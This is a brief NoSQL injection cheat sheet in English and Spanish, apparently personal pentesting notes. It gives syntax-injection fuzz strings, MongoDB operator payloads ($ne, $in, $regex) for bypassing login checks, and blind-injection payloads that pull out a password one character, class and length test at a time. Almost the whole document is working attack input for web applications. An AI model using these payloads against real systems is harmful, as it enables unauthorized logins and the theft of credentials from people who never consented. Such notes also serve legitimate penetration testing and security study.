# Syntax injection

Test: 
```
'"`{
;$Foo}
$Foo \xYZ
```
One-line: ```'"`{\n;$Foo}\n$Foo \xYZ```


Common payloads:
```
'||'1'=='1
'\u0000 -> Ignora todo lo que sigue
```

# Operator injection
- $where: Cumple una condición 
- $ne: not equal -> ```{"username":{"$ne":"invalid"}}``` OR  ```username[$ne]=invalid```
- $in: Dentro del array -> ```{"username":{"$in":["admin","administrator","superadmin"]}}```
- $regex: regex match -> ```{"username":{"$regex":"^a."}}```

# Blind NoSQLi
```
' && this.password[0] == 'a' || 'a'=='b
' && this.password.match(/\d/) || 'a'=='b -> ¿Tiene números?
' && this.password.match(/[A-Z]/) || 'a'=='b -> ¿Tiene mayúsculas?
' && this.password.match(/[^a-zA-Z0-9]/) || 'a'=='b -> ¿Tiene símbolos?
' && this.password.length == 8 || 'a'=='b -> ¿Cuál es la longitud?
```
